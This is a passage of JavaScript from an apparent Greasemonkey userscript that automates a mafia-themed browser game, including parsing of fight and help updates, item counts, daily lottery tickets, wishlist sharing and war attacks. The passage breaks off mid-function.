        '&nbsp;&nbsp;Weapon Type: <strong>' + cityWeapons[GM_getValue('buildWeaponId', 9)][0] + '</strong><br>' +
        'Build Armor: <strong>' + showIfUnchecked(GM_getValue('buildArmor')) + '</strong><br>' +
        '&nbsp;&nbsp;Armor Type: <strong>' + cityArmor[GM_getValue('buildArmorId', 9)][0] + '</strong><br>' +

        'Build Animal: <strong>' + showIfUnchecked(GM_getValue('buildAnimal')) + '</strong><br>' +
        '&nbsp;&nbsp;Animal Type: <strong>' + cityArmor[GM_getValue('buildAnimalId', 9)][0] + '</strong><br>' +

        'Build Port: <strong>' + showIfUnchecked(GM_getValue('buildPort')) + '</strong><br>' +
        '&nbsp;&nbsp;Port Type: <strong>' + cityPort[GM_getValue('buildPortId', 9)][0] + '</strong><br>' +

        'Ask for Chop Shop Parts: <strong>' + showIfUnchecked(GM_getValue('askShopParts')) + '</strong><br>' +
        '&nbsp;&nbsp;Part Type: <strong>' + cityShopParts[GM_getValue('askShopPartsId', 9)][0] + '</strong><br>' +
        'Ask for Weapon Depots Parts: <strong>' + showIfUnchecked(GM_getValue('askDepotParts')) + '</strong><br>' +
        '&nbsp;&nbsp;Part Type: <strong>' + cityDepotParts[GM_getValue('askDepotPartsId', 9)][0] + '</strong><br>' +
        'Ask for Armory Parts: <strong>' + showIfUnchecked(GM_getValue('askArmorParts')) + '</strong><br>' +
        '&nbsp;&nbsp;Part Type: <strong>' + cityArmorParts[GM_getValue('askArmorPartsId', 9)][0] + '</strong><br>' +
        'Ask for Zoo Parts: <strong>' + showIfUnchecked(GM_getValue('askZooParts')) + '</strong><br>' +
        '&nbsp;&nbsp;Part Type: <strong>' + cityZooParts[GM_getValue('askZooPartsId', 9)][0] + '</strong><br>' +

        'Ask for Casino Parts: <strong>' + showIfUnchecked(GM_getValue('askCasinoParts')) + '</strong><br>' +
        '&nbsp;&nbsp;Part Type: <strong>' + cityCasinoParts[GM_getValue('askCasinoPartsId', 9)][0] + '</strong><br>' +
        'Enable auto-bank in NY: <strong>' + showIfUnchecked(GM_getValue('autoBank')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: $<strong>' + GM_getValue('bankConfig') + '</strong><br>' +
        'Enable auto-bank in Cuba: <strong>' + showIfUnchecked(GM_getValue('autoBankCuba')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: C$<strong>' + GM_getValue('bankConfigCuba') + '</strong><br>' +
        'Enable auto-bank in Moscow: <strong>' + showIfUnchecked(GM_getValue('autoBankMoscow')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: R$<strong>' + GM_getValue('bankConfigMoscow') + '</strong><br>' +
        'Enable auto-bank in Bangkok: <strong>' + showIfUnchecked(GM_getValue('autoBankBangkok')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: B$<strong>' + GM_getValue('bankConfigBangkok') + '</strong><br>' +
        'Enable auto-bank in Vegas: <strong>' + showIfUnchecked(GM_getValue('autoBankVegas')) + '</strong><br>' +
        '&nbsp;&nbsp;-Minimum deposit: V$<strong>' + GM_getValue('bankConfigVegas') + '</strong><br>' +
        '&nbsp;&nbsp;-Vault Level: <strong>' + GM_getValue('vaultHandling') + '</strong><br>' +
        '&nbsp;&nbsp;-Free vault space: V$<strong>' + makeCommaValue(GM_getValue('vaultSpace')) + '</strong><br>' +
        '------------------About Tab-------------------<br>' +
        'Testing New Script Updates: <strong>'+ showIfUnchecked(GM_getValue('TestChanges')) + '</strong><br>' +
        '>  >  >  >  >  END SETTINGS DUMP  <  <  <  <  <');
}

// This function returns false if some further action has been taken and the
// caller should not make additional calls until that action has completed.
function parsePlayerUpdates(messagebox) {
  // Get the timestamp (e.g. "3 minutes ago")
  var minutesAgo = xpathFirst('.//div[@class="update_timestamp"]', messagebox);
  minutesAgo = minutesAgo? minutesAgo.innerHTML + ' ' : '';
  minutesAgo = minutesAgo.indexOf('0') == 0? '' : minutesAgo;

  // Get the text and links.
  var messageTextElt = xpathFirst('.//div[@class="update_txt"]', messagebox);
  if (!messageTextElt) {
    addToLog('warning Icon', 'BUG DETECTED: Unable to read update text.');
    return true;
  }
  var messageText = messageTextElt.innerHTML;
  var messageTextNoTags = messageText.untag();
  var links = messageTextElt.getElementsByTagName('a');
  var cost, user, result, userElt, elt, hitman;

  DEBUG(messageTextNoTags);

  if (messageTextNoTags.indexOf('attacked') != -1) {
     var attackCount = 1;
    // Attacked by some fool with a death wish.
    user = linkToString(links[0], 'user');
    result = 'Attacked';
    if (links[0] && links[0].nextSibling && links[0].nextSibling.nodeValue &&
        links[0].nextSibling.nodeValue.match(/(\d+) times/i)) {
      attackCount = parseInt( RegExp.$1);
      result += ' ' + RegExp.lastMatch;
    } else {
      if(messageTextNoTags.match(/(\d+) times/i)) {
        attackCount = parseInt(RegExp.$1);
        result += ' ' + RegExp.lastMatch;
      }
    }

    result += ' by ' + user;

    var needStatUpdate = false;
    if (messageTextNoTags.match(/you won.*you gained .*?(\d+) experience points?.*?([A-Z]?\$[\d,]*\d)/i)) {
      // The fight was won.
      cost = RegExp.$2;
      var experience = RegExp.$1;
      result += ' and <span class="good">WON</span>, gaining <span class="good">' + cost + '</span> and ' +
        '<span class="good">' + experience + ' experience</span>.';
      var cashLoc = parseCashLoc(cost);
      cost = parseCash(cost);
      experience = parseInt(experience);
      GM_setValue('passivetotalFightExpInt', parseInt(GM_getValue('passivetotalFightExpInt', 0) + experience));
      GM_setValue('passivefightWinCountInt', parseInt(GM_getValue('passivefightWinCountInt', 0) + attackCount));
      needStatUpdate = true;

      if (isGMChecked('hideAttacks')) {
        DEBUG('Riding Hitlist fight won.');
        GM_setValue('currentHitXp', parseInt((GM_getValue('currentHitXp', 0)) + experience));
        GM_setValue('currentHitDollars', String(parseInt(GM_getValue('currentHitDollars', 0)) + cost));
        DEBUG(result);
        if (isGMChecked('autoHeal')) {
          if (GM_getValue('rideHitlistXP', 0) == 0 && experience == 0 && GM_getValue('currentHitXp', 0) > 12) {
            DEBUG('Zero experience detected; turning off auto-heal.<br>(currentHitXp = ' + GM_getValue('currentHitXp', 0) + ')');
            GM_setValue('autoHeal', 0);
          } else if (GM_getValue('rideHitlistXP', 0) > 0 && GM_getValue('currentHitXp', 0) >= GM_getValue('rideHitlistXP', 0)) {
            DEBUG(GM_getValue('currentHitXp', 0) + ' experience accumulated; turning off auto-heal.');
            GM_setValue('autoHeal', 0);
          }
        }
      } else {
        addToLog('updateGood Icon', minutesAgo + result);
      }

//      NEEDS FIX - player updates need their own stats and a place to put them in the log (tabbed log
//      perhaps?)
//      The setValue commands below should not be updating auto-fight stats as it thows off
//      the gain rate, stamina req'd to level and ultimately  the auto-burn stamina for level up action.
//      Leaving in as placeholders. --AK17710N
//
//      GM_setValue('fightWinCountInt', (GM_getValue('fightWinCountInt', 1) + 1));
//      GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + experience);
      if (cost) {
        //GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cost));
        switch (cashLoc) {
          case NY: GM_setValue('passivefightWin$NY', String(parseInt(GM_getValue('passivefightWin$NY', 0)) + cost)); break;
          case CUBA: GM_setValue('passivefightWin$Cuba', String(parseInt(GM_getValue('passivefightWin$Cuba', 0)) + cost)); break;
          case MOSCOW: GM_setValue('passivefightWin$Moscow', String(parseInt(GM_getValue('passivefightWin$Moscow', 0)) + cost)); break;
          case BANGKOK: GM_setValue('passivefightWin$Bangkok', String(parseInt(GM_getValue('passivefightWin$Bangkok', 0)) + cost)); break;
          case LV: GM_setValue('passivefightWin$Vegas', String(parseInt(GM_getValue('passivefightWin$Vegas', 0)) + cost)); break;
        }
        needStatUpdate = true;
      }
    } //else if (messageTextNoTags.match(/you lost.*and losing .*?([A-Z]?\$[\d,]*\d)/i)) {
    else if (messageTextNoTags.match(/([A-Z]?\$[\d,]*\d)/i)) {

      // The fight was lost.
      cost   = RegExp.$1;
      result += ' and <span class="bad">LOST</span>, losing <span class="bad">' + cost + '</span>.';
      var cashLoc = parseCashLoc(cost);
      cost = parseCash(cost);
      GM_setValue('passivefightLossCountInt', GM_getValue('passivefightLossCountInt', 0) + attackCount);
      needStatUpdate = true;

      if (isGMChecked('hideAttacks')) {
        DEBUG('Ride Hitlist fight lost.');
        GM_setValue('currentHitDollars', String(parseInt(GM_getValue('currentHitDollars', 0)) - cost));
        DEBUG(result);
      } else {
        addToLog('updateBad Icon', minutesAgo + result);
      }

//      NEEDS FIX - player updates need their own stats and a place to put them in the log (tabbed log
//      perhaps?)
//      The setValue commands below should not be updating auto-fight stats as it throws off
//      the gain rate, stamina req'd to level and ultimately the auto-burn stamina for level up action.
//      Leaving in as placeholders. --AK17710N
//
//      GM_setValue('fightLossCountInt', (GM_getValue('fightLossCountInt', 1) + 1));
      if (cost) {
        //GM_setValue('totalLossDollarsInt', String(parseInt(GM_getValue('totalLossDollarsInt', 0)) + cost));
        switch (cashLoc) {
          case NY: GM_setValue('passivefightLoss$NY', String(parseInt(GM_getValue('passivefightLoss$NY', 0)) + cost)); break;
          case CUBA: GM_setValue('passivefightLoss$Cuba', String(parseInt(GM_getValue('passivefightLoss$Cuba', 0)) + cost)); break;
          case MOSCOW: GM_setValue('passivefightLoss$Moscow', String(parseInt(GM_getValue('passivefightLoss$Moscow', 0)) + cost)); break;
          case BANGKOK: GM_setValue('passivefightLoss$Bangkok', String(parseInt(GM_getValue('passivefightLoss$Bangkok', 0)) + cost)); break;
          case LV: GM_setValue('passivefightLoss$Vegas', String(parseInt(GM_getValue('passivefightLoss$Vegas', 0)) + cost)); break;
        }
        needStatUpdate = true;
      }
    } else if (messageTextNoTags.match(/taking (\d+) damage/i)) {
      result += ' and <span class="bad">LOST</span>, taking <span class="bad">'+RegExp.$1+'</span> damage .';
      addToLog('updateBad Icon', minutesAgo + result);
    } else {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read update win/loss.');
    }
    if (needStatUpdate) updateLogStats();
  } else if (messageTextNoTags.indexOf('You were snuffed') != -1) {
    // Death. Ouch.
    GM_setValue('snuffCount', parseInt( GM_getValue('snuffCount', 0) + 1));
    needStatUpdate = true;
    addToLog('updateBad Icon', minutesAgo + 'You <span class="bad">' + 'DIED' + '</span>.');

    GM_setValue('passivetotalFightExpInt', parseInt(GM_getValue('passivetotalFightExpInt', 0)) - 6);
  } else if (messageTextNoTags.indexOf('You were knocked out') != -1) {
    // Hitlist ride has ended.
    hitman = linkToString(links[0], 'user');
    user = linkToString(links[1], 'attacker');
    var bounty = parseCash(messageTextNoTags.split(' who claimed the ')[1]);
    result = 'Whacked by '+ hitman + ' who claimed the $' +
             makeCommaValue(parseInt(bounty)) + ' bounty set by ' +
             user + '.';

    GM_setValue('whackedCount', parseInt( GM_getValue('whackedCount', 0) + 1));
    needStatUpdate = true;

    if (isGMChecked('hideAttacks')) {
      DEBUG('Whacked riding hitlist.');
      GM_setValue('currentHitXp', parseInt(GM_getValue('currentHitXp', 0)) - 6);
      GM_setValue('totalHits', parseInt(GM_getValue('totalHits', 0)) + 1);
      GM_setValue('totalXp', parseInt(GM_getValue('totalXp', 0)) + parseInt(GM_getValue('currentHitXp', 0)));
      GM_setValue('lastHitXp', parseInt(GM_getValue('currentHitXp', 0)));
      GM_setValue('totalHitDollars', String(parseInt(GM_getValue('currentHitDollars', 0)) + parseInt(GM_getValue('totalHitDollars', 0))));
      var currentHitXp, currentHitDollars;
      if (GM_getValue('currentHitXp', 0) < 0) {
        currentHitXp = '<span class="bad">LOST ' + GM_getValue('currentHitXp', 0) + '</span>';
      } else {
        currentHitXp = '<span class="good">GAINED ' + GM_getValue('currentHitXp', 0) + '</span>';
      }
      if (parseInt(GM_getValue('currentHitDollars', 0)) < 0) {
        currentHitDollars = '<span class="bad">' +
                                ' LOST $' + makeCommaValue(parseInt(GM_getValue('currentHitDollars', 0))) + '</span>';
        addToLog('updateBad Icon', minutesAgo + currentHitXp + ' experience and ' + currentHitDollars + ' on the hitlist.');
      } else {
        currentHitDollars = '<span class="good">' +
                                ' WON $' + makeCommaValue(parseInt(GM_getValue('currentHitDollars', 0))) + '</span>';
        addToLog('updateGood Icon', minutesAgo + currentHitXp + ' experience and ' + currentHitDollars + ' on the hitlist.');
      }

      DEBUG('Hitlist total values set; now clearing current values.');
      GM_setValue('currentHitXp', 0);
      GM_setValue('currentHitDollars', '0');
      DEBUG('Ensure that autoHeal is enabled.');
      GM_setValue('autoHeal', 'checked');

    }
    addToLog('updateBad Icon', minutesAgo + result);

  } else if (messageTextNoTags.indexOf('You were punched') != -1) {
    // Punched by some wuss.
    user = linkToString(links[0], 'attacker');
    result = 'You were punched in the face by ' + user + '.';
    addToLog('updateBad Icon', minutesAgo + result);

  } else if (messageTextNoTags.indexOf('You fought as') != -1) {
    // Helped a fellow mafia member in a fight.
    var capo = linkToString(links[0], 'user');
    user = linkToString(links[1], 'user');
    cost = messageTextNoTags.match(REGEX_CASH);
    result = 'You fought as ' + capo + "'s Capo and defeated " +
             user + ', receiving ' + '<span class="good">' +
             cost + '</span> for your efforts.';
    addToLog('updateGood Icon', minutesAgo + result);

  } else if (messageTextNoTags.indexOf('needs your help') != -1) {
    if (isGMChecked('autoHelp')) {
      // Help requested by a fellow mafia member.
      userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(@href, "give_help")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickAction = 'help';
          clickContext = {
            user: linkToString(userElt, 'user'),
            help: linkToString(elt)
          };
          clickElement(elt);
          DEBUG('Clicked to help with a job.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find help element.');
      }
    }

  } else if (messageTextNoTags.indexOf('went to war with') != -1) {
    if (isGMChecked('autoWarHelp')) {
      // War assist requested by a fellow mafia member.
      userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(text(), "Help out your friends")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickContext = {
            user: linkToString(userElt, 'user'),
            help: linkToString(elt)
          };
          clickElement(elt);
          helpWar = true;
          DEBUG('Clicked to help in war.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find war help element.');
      }
    }

  } else if (messageTextNoTags.indexOf('needs more Burners') != -1) {
    if (isGMChecked('autoBurnerHelp')) {
      // Help requested by a fellow mafia member.
      userElt = xpathFirst('.//a[contains(@onclick, "controller=stats")]', messagebox);
      elt = xpathFirst('.//a[contains(@href, "action=call_for_help_get_phone")]', messagebox);
      if (elt) {
        // Help immediately.
        Autoplay.fx = function() {
          clickAction = 'help burners';
          clickContext = {
            user: linkToString(userElt, 'user'),
            help: linkToString(elt)
          };
          clickElement(elt);
          DEBUG('Clicked to help with burners.');
        };
        Autoplay.delay = noDelay;
        Autoplay.start();
        return false;
      } else {
        addToLog('warning Icon', 'BUG DETECTED: Unable to find burner help element.');
      }
    }

  } else if (isGMChecked('autoPartsHelp') && (
              messageTextNoTags.match(/(.*) is close to completing a/i) || // 'but still needs a few more'
              messageTextNoTags.match(/(.*) wants to build an awesome/i) ||
              messageTextNoTags.match(/(.*) has decided to upgrade/i)
            )) {
    // Help requested by a fellow mafia member.
    var userText = RegExp.$1;
    elt = xpathFirst('.//a[contains(@onclick, "action=cs_help_item") or contains(@onclick, "action=cs_help_initial")]', messagebox);
    if (elt) {
      // Help immediately.
      Autoplay.fx = function() {
        clickAction = 'help parts';
        clickContext = {
          user: userText,
          help: linkToString(elt)
        };
        clickElement(elt);
        DEBUG('Clicked to help with parts.');
      };
      Autoplay.delay = noDelay;
      Autoplay.start();
      return false;
    } else {
      addToLog('warning Icon', 'BUG DETECTED: Unable to find parts help element.');
    }

  } else if (messageTextNoTags.indexOf('claimed your $') != -1) {
    // Bounty claimed. Whoever was hitlisted is sleeping with the fishes.
    hitman = linkToString(links[0], 'user');
    user = linkToString(links[1], 'attacker');
    result = hitman + ' claimed your ' +
             messageTextNoTags.match(REGEX_CASH)[0] +
             ' bounty on ' + user + '.';
    addToLog('updateGood Icon', minutesAgo + result);

  } else if (messageTextNoTags.match(/you earned.*achievement/i)) {
    // You earned an achievement.
    addToLog('updateGood Icon', minutesAgo + messageText);

  } else if (messageTextNoTags.match(/earned some great items/i)) {
    // Social reward, no need to collect. Ignore it.
    DEBUG(minutesAgo + messageText);

  } else if (messageTextNoTags.match(/earned the.*achievement/i)) {
    // Someone else earned an achievement. Who cares!
    DEBUG(minutesAgo + messageText);

  } else if (messageTextNoTags.match(/went to war with you/i)) {
    // Someone declared war on us!
    DEBUG(minutesAgo + messageText);

  } else if (messageTextNoTags.match(/declared war against you/i)) {
    // Someone declared war on us!
    DEBUG('found playerupdate: ' + minutesAgo + messageText);

   // mission has been completed
  } else if (messageTextNoTags.match(/mission has been completed/i)) {
    // notice of a mission completed go collect it
    DEBUG('found playerupdate mission notice: ' + minutesAgo + messageText);

  } else {
    // Just copy the update text straight into the log.
    addToLog('info Icon', minutesAgo + messageText);
  }

  return true;
}

function profileFix() {
  var lists = $x('.//ul[@class="nice_list items_list clearfix"]', innerPageElt);
  if (!lists || lists.length < 4 || xpathFirst('./div[contains(@style,"border") and contains(@style,"padding")]/div[@class="title"]/span', innerPageElt))
    return;

  // Count the number of items in each item list.
  var itemCount = [];
  for (var i = 0; i < 4; i++) {
    itemCount[i] = 0;
    var elts = $x('./li/div[2]', lists[i]);
    for (var j = elts.length - 1; j >= 0; --j) {
      if (elts[j].innerHTML.match(/(\d+)/))
        itemCount[i] += parseInt(RegExp.$1);
    }
  }

  var findItems = xpath('./div[contains(@style,"border") and contains(@style,"padding")]/div[@class="title"]', innerPageElt);
  var greenText = 'color:#52E259;';
  var redText = 'color:#EC2D2D;';
  if (findItems && findItems.snapshotLength >= 3 && findItems.snapshotLength <= 5) {
    for (var locateBlock = 0; locateBlock < findItems.snapshotLength; ++locateBlock) {
      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Weapons') {
        if ((mafia <= itemCount[0]) || (itemCount[0] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode('(' + itemCount[0] + ')'));
      }

      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Armor') {
        if ((mafia <= itemCount[1]) || (itemCount[1] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode(' (' + itemCount[1] + ')'));
      }

      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Vehicles') {
        if ((mafia <= itemCount[2]) || (itemCount[2] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode('(' + itemCount[2] + ')'));
      }

      if (findItems.snapshotItem(locateBlock).innerHTML.ltrim().rtrim() == 'Animals') {
        if ((mafia <= itemCount[3]) || (itemCount[3] > 500))
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':greenText});
        else
          j = makeElement('span', findItems.snapshotItem(locateBlock), {'style':redText});
        j.appendChild(document.createTextNode('(' + itemCount[3] + ')'));
      }
    }
  }
}

// Fetch the action message box
function getActionBox(boxDesc) {
  if (!onHome()) return false;
  var boxElt = xpathFirst('.//div[@class="message_box_full_border" and contains(.,"'+boxDesc+'")]', innerPageElt);
  if (boxElt) return boxElt;
  return false;
}

// Fetch the action link for the given message box
function getActionLink(boxDiv, linkText) {
  var linkElt = xpathFirst('.//a[contains(.,"'+linkText+'")]', boxDiv);
  if(!linkElt)linkElt = xpathFirst('.//a//span[contains(.,"'+linkText+'")]', boxDiv);
  if(!linkElt)linkElt = xpathFirst('.//a//span//span[contains(.,"'+linkText+'")]', boxDiv);
  if (linkElt) return linkElt;
  return false;
}

function autoLotto() {
  Autoplay.delay = getAutoPlayDelay();

  if (!onLottoTab()){
    if (!onMarketTab()) {
      goMarketPlace();
      DEBUG('Going to Market Place');
      return;
    }

    // Go to the daily chance menu
    var eltDailyChance = xpathFirst('.//a[contains(.,"Daily Chance")]', innerPageElt);
    if(!eltDailyChance)  eltDailyChance = xpathFirst('.//a[@class="name_container" and contains(.,"Daily Chance")]', innerPageElt);
    if(!eltDailyChance) eltDailyChance = xpathFirst('.//a[@class="name_container" and contains(text(),"Daily Chance")]', innerPageElt);
    if(!eltDailyChance) eltDailyChance = xpathFirst('.//a[@class="name_container" and contains(@onclick,"xw_controller=lotto")]', innerPageElt);
    DEBUG('Going to Daily Chance Page');
    if(eltDailyChance){
      DEBUG(eltDailyChance.innerHTML);
      Autoplay.fx = function(){
        if(eltDailyChance){
          clickElement(eltDailyChance);
          DEBUG('Clicked to go to Daily Chance.');
        }
      };
      Autoplay.start();
      return true;
    } else {
      DEBUG('eltDailyChance.innerHTML not FOUND');
    }
  }

  // Are we supposed to grab a mastery prize?
  if (isGMChecked('autoLottoBonus')) {
    // Grab the progress status
    var lottoProgress = xpath('.//div/span[contains(@style, "font-size: 20px; font-weight: bold") and contains(text(), " of 6")]', innerPageElt);
    if (lottoProgress.snapshotLength != 0) {
      lottoProgress = lottoProgress.snapshotItem(0).parentNode.innerHTML;

      // This is the prize number
      var lottoPrize = parseInt(lottoProgress.substr(lottoProgress.indexOf(" of 6") - 1, 1));
      DEBUG('Daily Chance Prize = ' + autoLottoBonusList[lottoPrize - 1]);

      // Is the current item the correct one?
      if (lottoPrize == (GM_getValue('autoLottoBonusItem', 0) + 1)) {
        // Grab the mastery button
        var bonusClaim = xpathFirst('.//a/span[contains(@class, "sexy_lotto") and contains(text(), "Claim Prize")]', innerPageElt);
        if(!bonusClaim) bonusClaim = xpathFirst('.//a[@class="sexy_button_new short white" and contains(., "Claim Prize")]', innerPageElt);
        if (bonusClaim) {
          Autoplay.fx = function() {
            clickElement(bonusClaim);
            addToLog('info Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance</span>: Claimed bonus: ' + autoLottoBonusList[GM_getValue('autoLottoBonusItem', 0)]);
            DEBUG('Claimed Daily Chance bonus item: ' + lottoPrize);
          };
          Autoplay.start();
          return true;
        }
        // Safety net. If we get here, then the page layout has changed and the buttons cannot be found
        DEBUG('Cannot click the Daily Chance bonus button.');
        Autoplay.fx = goMarketPlace();
        Autoplay.start();
        return false;
      } else {
        DEBUG('Daily Chance bonus not matched.');
      }
    }
  }
  var randomTicket = xpathFirst('.//div[@class="sexy_button" and contains(text(), "Auto-Select Numbers")]', innerPageElt);
  if (!randomTicket) randomTicket = xpathFirst('.//a[@class="sexy_button_new short white" and @onclick="autoSelect(1);"]', innerPageElt);
  if (!randomTicket) randomTicket = xpathFirst('.//a[@class="sexy_button_new short white" and contains(., "Auto-Select Numbers")]', innerPageElt);
  if (randomTicket) {
    clickElement(randomTicket);
    DEBUG('Daily Chance : Random Ticket Generated - Submitting Tickets');
    var submitTicket = xpathFirst('.//input[@class="sexy_lotto" and @type="submit" and contains(@value,"Submit Ticket")]', innerPageElt);
    //if (!submitTicket) submitTicket = xpathFirst('.//button[@class="sexy_button_new short white" and @type="submit" and contains(.,"Submit Tickets")]', innerPageElt);
    if (!submitTicket) submitTicket = xpathFirst('.//button[@class="sexy_button_new short white" and @type="submit" and contains(.,"Submit Ticket")]', innerPageElt);
    if (submitTicket) {
      DEBUG('Daily Chance : Submitting Tickets Button found');
      var ticket = ' ';
      for (i = 1; i < 6; i++) {
        var searchstring = './/div[@id="ticket_1_selected_' + i + '"]';
        lottonum = xpathFirst(searchstring, innerPageElt);
        ticket = ticket + lottonum.innerHTML;
        if (i<5)
          ticket = ticket + '-';
      }
      clickElement(submitTicket);
      addToLog('info Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance</span>: Played ticket' + ticket + '.');
      Autoplay.fx = goMarketPlace();
    } else {
      DEBUG('Daily Chance : Submitting Tickets Failed');
    }
    Autoplay.start();
    return true;
  }

  var lottoResults = xpathFirst('.//li[contains(@class, "tab_on")]//a[contains(text(), "Results")]', innerPageElt);
  if (lottoResults) {
    var totalwinning = 0;
    var lottotable = xpath('.//table//tbody//tr//td[contains(text(), "Ticket #")]', innerPageElt);
    if (lottotable.snapshotLength == 0) {
      var noticketsEntered = xpath('.//center//div', innerPageElt);
      if ((noticketsEntered) && (noticketsEntered.snapshotLength>0) &&
         (noticketsEntered.snapshotItem(1).parentNode.innerHTML.indexOf("You didn't enter any tickets")!=-1))
        addToLog('info Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance</span>: No tickets entered for the last drawing.');
      else
        addToLog('warning Icon', 'BUG DETECTED: Can\'t find Daily Chance results.');
      return false;
    }
    var winningtickets = [0, 0, 0, 0, 0, 0];
    for (j = 0, numTickets=lottotable.snapshotLength; j < numTickets; j++) {
      var eachticket = lottotable.snapshotItem(j).parentNode.innerHTML;
      var count = 0;
      for (var k = 0, ticketLength=eachticket.length; k < ticketLength; k++) {
        if (eachticket.substr(k, 'gold'.length) == 'gold')
          count++;
      }
      winningtickets[count] = winningtickets[count] + 1;
    }
    var lottoLog = '<span style="font-weight:bold;color:rgb(255,217,39);">Daily Chance winners</span>: ';
    var atleastOneWinner = false;
    for (j = 1; j < 6; j++)
      if (winningtickets[j]>0) {
        atleastOneWinner = true;
        if (winningtickets[j] == 1)
          lottoLog += winningtickets[j] + ' ticket';
        else
          lottoLog += winningtickets[j] + ' tickets';
        if (j == 1)
          lottoLog +=  ' matching ' + j + ' number;';
        else
          lottoLog += ' matching ' + j + ' numbers;';
      }
    if (lottoLog[lottoLog.length-1]==';')
      lottoLog = lottoLog.substring(0, lottoLog.length-1)+'.';
    else if (!atleastOneWinner)
      lottoLog += 'no winning tickets.';
    addToLog('info Icon', lottoLog);

    // Log any displayed prizes.
    if (atleastOneWinner) {
      var prizes = $x('.//table[@class="messages"]//center', innerPageElt);
      for (i = 0, numPrizes=prizes.length; i < numPrizes; ++i) {
        var description = prizes[i].innerHTML.untag().trim();
        if (description) {
          addToLog('yeah Icon', '<span style="font-weight:bold;color:rgb(255,217,39);">Prize</span>: ' + description);
        }
      }
    }
    Autoplay.fx = goMarketPlace();
    Autoplay.start();
    return true;
  }
  setGMTime('autoLottoTimer', '4 hours');
  return false;
}

function autoWishlist() {
  var shareWishlist = parseFloat(GM_getValue('autoShareWishlistTime', '1'));
  // Go to the wishlist.
  var elt = xpathFirst('//div[@class="nav_link profile_link"]//a');
  var wishlistElt = xpathFirst('.//div[@id="wishlist_share_button"]', innerPageElt);
  if (elt) {
    clickElement(elt);
    DEBUG('Redirecting to post wishlist');
    if (wishlistElt) {
      var buttonElt = xpathFirst('.//a', wishlistElt);
      if (buttonElt) {
          clickElement(buttonElt);
          addToLog('info Icon','Clicked to share wishlist, sharing again in '+shareWishlist+' hour(s)');
          if(shareWishlist == 1)
            setGMTime('wishListTimer', '1 hour');
          else
            setGMTime('wishListTimer', shareWishlist + ' hours');
      } else {
        addToLog('warning Icon', 'Unable to share your wishlist, will try later.');
        setGMTime('wishListTimer', '30:00');
      }
    } else {
      setGMTime('wishListTimer', '30:00');
    }
  } else {
    setGMTime('wishListTimer', '30:00');
  }
}

// Attack the first war opponent you can
function autoWarAttack() {

  if (helpWar) {
    // Help attempt was processed. Increment the update count.
    GM_setValue('logPlayerUpdatesCount', 1 + GM_getValue('logPlayerUpdatesCount', 0));
    helpWar = false;
  }

  var warTargetEnnemies = $x('.//a[contains(@href, "xw_controller=war&xw_action=attack")]', innerPageElt);
  if(warTargetEnnemies){
    // Pick a Random Target out of the Targets List
    DEBUG('Enemy Targets Found ...');
    var warElt = warTargetEnnemies[Math.floor(Math.random() * warTargetEnnemies.length)];
    if(warElt){
      // Attack the Selected Target
      Autoplay.fx = function() {
        clickAction = 'war';
        clickContext = warElt;
        clickElement(warElt);
      };
      Autoplay.start();
      DEBUG('Helped by attacked Selected Target in ongoing war.');
      return true;
    } else {
      DEBUG('Unable to Help: Invalid War Target in ongoing war...');
    }
  }
  else {
    DEBUG('Unable to Help: No Enemy Targets found for ongoing war...');
  }
  return false;
}

function autoWar() {
  var action = 'war';
  Autoplay.delay = getAutoPlayDelay();

  // We need to be on the war page to go any further
  if (!onWarTab()) {
    Autoplay.fx = goWarTab;
    Autoplay.start();
    return true;
  }

  // Check for a war that may already be under way : Is there a War Countdown ?
  var warStatus = xpathFirst('.//span[contains(@id, "war_timer")]', innerPageElt);
  // War Countdown found
  if (warStatus) {
    var warTimer = warStatus.innerHTML;
    //Check the war tab to see if there are enemy targets
    var warTargetEnnemies = $x('.//a[contains(@href, "xw_controller=war&xw_action=attack")]', innerPageElt);
    if(warTargetEnnemies){
      // Pick a Random Target out of the Targets List
      var warElt = warTargetEnnemies[Math.floor(Math.random() * warTargetEnnemies.length)];
      if(warElt){
        // Attack the Selected Target
        Autoplay.fx = function() {
          clickAction = action;
          clickContext = warElt;
          clickElement(warElt);
        };
        Autoplay.start();
        DEBUG('Attacked Selected Target in ongoing war.');
        return true;
      }
    }

    var callWarHelp = xpathFirst('.//a[@class="sexy_button_new short white sexy_call_new" and contains(@onclick, "postFeedAndSendCallForHelp") and not(contains(@class,"skip"))]');
    if (callWarHelp && isGMChecked('autoWarResponsePublish')) {
      clickElement(callWarHelp);
      // Call for Help
      Autoplay.fx = function() {
        clickAction = action;
        clickContext = callWarHelp;
